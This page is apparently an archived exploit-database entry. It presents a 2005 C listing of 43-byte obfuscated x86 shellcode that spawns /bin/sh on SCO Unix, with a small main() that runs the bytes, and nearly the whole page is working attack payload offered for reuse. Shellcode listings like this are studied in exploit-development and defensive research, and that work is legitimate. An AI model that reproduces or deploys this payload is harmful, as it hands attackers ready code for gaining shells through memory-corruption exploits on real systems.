<html><head><title>Sco/x86 - execve(/bin/sh, ..., NULL) - 43 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  minervini at neuralnoise dot com (c) 2005
 *  SCO_SV scosysv 3.2 5.0.7 i386, execve(&quot;/bin/sh&quot;, ..., NULL);
 */

#include &quot;sys/types.h&quot;
#include &quot;stdio.h&quot;

char *scode = 
  &quot;\x31\xc9&quot;             // xor    %ecx,%ecx
  &quot;\x89\xe3&quot;             // mov    %esp,%ebx
  &quot;\x68\xd0\x8c\x97\xff&quot; // push   $0xff978cd0
  &quot;\x68\xd0\x9d\x96\x91&quot; // push   $0x91969dd0
  &quot;\x89\xe2&quot;             // mov    %esp,%edx
  &quot;\x68\xff\xf8\xff\x6f&quot; // push   $0x6ffff8ff
  &quot;\x68\x9a\xff\xff\xff&quot; // push   $0xffffff9a
  &quot;\x80\xf1\x10&quot;         // xor    $0x10,%cl
  &quot;\xf6\x13&quot;             // notb   (%ebx)
  &quot;\x4b&quot;                 // dec    %ebx
  &quot;\xe2\xfb&quot;             // loop   $-3
  &quot;\x91&quot;                 // xchg   %eax,%ecx
  &quot;\x50&quot;                 // push   %eax
  &quot;\x54&quot;                 // push   %esp
  &quot;\x52&quot;                 // push   %edx
  &quot;\x50&quot;                 // push   %eax
  &quot;\x34\x3b&quot;             // xor    $0x3b,%al
  &quot;\xff\xe3&quot;;            // jmp    *%ebx

int main () {
   void (*code) () = (void *) scode;
   printf(&quot;length: %d\n&quot;, strlen(scode));
   code();
   return (0);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
